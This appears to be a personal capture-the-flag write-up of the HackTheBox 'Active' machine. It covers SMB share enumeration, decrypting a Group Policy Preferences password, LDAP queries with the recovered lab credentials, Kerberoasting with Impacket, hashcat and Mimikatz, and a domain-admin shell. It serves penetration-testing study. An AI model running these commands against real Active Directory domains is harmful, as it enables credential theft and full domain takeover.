

# Active


## SYNOPSIS

Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an** Active Directory **environment.

****

*Basic knowledge of Active Directory authentication and shared folders*
***
*SMB enumeration techniques (courtesy of IppSec Active video)*
***
*Group Policy Preferences Groups.xml enumeration and exploitation*
***
*Identification and exploitation of Kerberoastable accounts*
***

## Enumeration

### Nmap

```bash

masscan -p1-65535 10.10.10.100 --rate=1000 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' |

sort -n | tr '\n' ',' | sed 's/,$//')

nmap -Pn -sV -sC -p$ports 10.10.10.100
```

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FPasted%20image%2020210419231815.png?1618946987752)
***
*Nmap* reveals an *Active Directory* installation with a domain of *active.htb*. *Microsoft DNS 6.1* is running, which allows *nmap* to fingerprint the domain controller as *Windows Server 2008 R2 SP1*.
***
Port **445** is open and so it is worth running further *nmap* **SMB** scripts.

`nmap --script safe -445 10.10.10.100`

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FPasted%20image%2020210419231916.png?1618947046918)

This reveals that *SMB* *version 2 *is running, and message signing is enabled and required for any clients connecting to it, which prevents SMB Relay attacks.


## File Shares

`smbclient` can now be used to enumerate any available file shares.

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FPasted%20image%2020210419231948.png?1618947060077)

The only share it is possible to access with *anonymous credentials* is the “**Replication**” share, which seems to be a copy of **SYSVOL**. 
This is potentially interesting from a *privilege escalation* perspective as **Group Policies (and Group Policy Preferences) are stored in the SYSVOL share**, **which is world-readable to authenticated users.**
 ***
 
In the Active video, IppSec shows different ways of extracting the Groups.xml file from Linux.

`smbclient` with with `RECURSE` set to `ON`

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FPasted%20image%2020210419232422.png?1618947158960)

***

`smbmap`, which allows for the **Groups.xml** files to be targeted 

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FPasted%20image%2020210419232511.png?1618947188211)

***

`mount`, which allows for more powerful enumeration:
```
sudo apt-get install cifs-utils

mkdir /mnt/Replication

mount -t cifs //10.10.10.100/Replication /mnt/Replication -o

username=<username>,password=<password>,domain=active.htb

grep -R password /mnt/Replication/

```

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FPasted%20image%2020210419232959.png?1618947345882)


## Group Policy Preferences

*Group Policy Preferences (GPP)* was introduced in* Windows Server 2008*, and among many other features, allowed administrators to modify users and groups across their network.

An example use case is where a company’s gold image had a weak local administrator password and administrators wanted to retrospectively set it to something stronger. 

The defined password was AES-256 encrypted and stored in Groups.xml. However, at some point in 2012 Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low hanging fruit.

The downloaded *Groups.xml* file is inspected and the encrypted password is immediately decrypted using *gpp-decrypt*

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FOSCP%20Writeups%2FHackTheBox%2FActive%2FScreenshots%2FPasted%20image%2020210419235126.png?1618949556689)

The domain account **SVC\_TGS** has the password *GPPstillStandingStrong2k18*


## Authenticated Enumeration

With *valid credentials* for the *active.htb* **domain**, *further enumeration* can be undertaken.

`smbmap -d <domain> -u <username> -p <password> -H <HOST>`
![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FOSCP%20Writeups%2FHackTheBox%2FActive%2FScreenshots%2FPasted%20image%2020210419233413.png?1618947573527)
***

The **SYSVOL** and **Users** shares are now accessible and the *user.txt flag* can be retrieved.

***

`ldapsearch` can be used to query the** Domain Controller** for *Active Directory *-**UserAccountControl** attributes of active accounts, and for other specific configurations that might be applied to them.

A number of **UserAccountControl** attributes also have security relevance. 
The Microsoft page below lists the possible UserAccountControl values.

[https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro](https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)

The value of “**2**” corresponds to a **disabled account** status, and so the query below will return active users (by **sAMAccountName** / username) in the *active.htb* domain.

```
ldapsearch -x -h 10.10.10.100 -p 389 \
-D 'SVC\_TGS' -w 'GPPstillStandingStrong2k18' \
-b "dc=active,dc=htb" \
-s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
```

***
Impacket’s GetADUsers.py simplifies the process of enumerating domain user accounts.

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FOSCP%20Writeups%2FHackTheBox%2FActive%2FScreenshots%2FPasted%20image%2020210419233751.png?1618947630816)
***


## Exploitation

### Kerberoasting

**Kerberos Authentication and Service Principal Names**

Another common technique of gaining privileges within an Active Directory Domain is “*Kerberoasting*”, which is an offensive technique created by Tim Medin and revealed at DerbyCon 2014.
Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS\_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS\_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running. 

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FOSCP%20Writeups%2FHackTheBox%2FActive%2FScreenshots%2FPasted%20image%2020210419234140.png?1618947700596)

**Kerberos Authentication Process, based on [https://adsecurity.com?p=2293**](https://adsecurity.com/?p=2293)**


Managed service accounts mitigate this risk, due to the complexity of their passwords, but they are not in active use in many environments. 
It is worth noting that shutting down the server hosting the service doesn’t mitigate, as the attack doesn’t involve communication with target service. 
It is therefore important to regularly audit the purpose and privilege of all enabled accounts.

Kerberos authentication uses* Service Principal Names* (SPNs) to identify the account associated with a particular service instance. `ldapsearch` can be used to identify accounts that are configured with SPNs.

**Identification of configured SPNs and extraction of hash**

```
ldapsearch -x -h 10.10.10.100 -p 389 -D \
'SVC\_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" \
-s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=\*/\*))" serviceprincipalname | grep -B 1 servicePrincipalName
```

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FPasted%20image%2020210419234306.png?1618947841145)

It seems that the **active\Administrator ** account has been configured with a SPN.
***

Impacket’s **GetUserSPNs.py** again simplifies this process, and is also able to request the TGS and extract the hash for offline cracking.

![](app://local/%2FUsers%2Fjulianweber%2Fcloud%2FNotes%2FPentesting%2FOSCP%20Writeups%2FHackTheBox%2FActive%2FScreenshots%2FPasted%20image%2020210419234330.png?1618947877789)


**Cracking of Kerberos TGS Hash**

The hash cracks easily with `hashcat` and `john`, 
and the **active\administrator ** password of *Ticketmaster1968* is obtained.

``` 
hashcat/hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt--force --potfile-disable


```
***

**Shell as Primary Domain Admin**

Impacket’s **wmiexec.py** can be used to get a shell as **active\administrator**, and gain *root.txt*.

***

**Bonus: The “Old School” Kerberoasting Technique**

There are many ways of kerberoasting from Windows and Linux, and Tim Medin’s original Kerberoasting technique is replicated below, which leverages functionality in Benjamin Delpy’s Mimikatz to export the Kerberos tickets.
im Medin’s “kerberoast” repo (below) has been used as reference.
<https://github.com/nidem/kerberoast>
***

From a domain joined computer, available SPNs and associated accounts can be enumerated

using the Windows built-in utility **setspn.exe**.

```
setspn.exe -T active.htb -F -Q \*/\*
```

**The tickets are then requested and extracted from RAM.**

```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
-ArgumentList "active/CIFS:445"
```

The **.kirbi Kerberos tickets** can be collected in a zip file before transferring (PowerShell 3.0+).
```
Add-Type -Assembly "System.IO.Compression.FileSystem"

[System.IO.Compression.ZipFile]::CreateFromDirectory("c:\temp\kirbi\", c:\temp\kirbi.zip")
```


**kirbi2john.py** (based on Tim Medin’s script) is used to** extract the hashes from kirbi files**. 

The Jumbo version of John the Ripper cracks the hash quickly.

```
/opt/JohnTheRipper/run/kirbi2john.py 1-40a00000-svc\_tgs@active~CIFS~445-ACTIVE.HTB.kirbi > hashes.txt

/opt/JohnTheRipper/run/john --format:krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
````

The venerable sysadmin tool **psexec.exe** is used to get a shell as SYSTEM using the gained Domain Admin credentials.


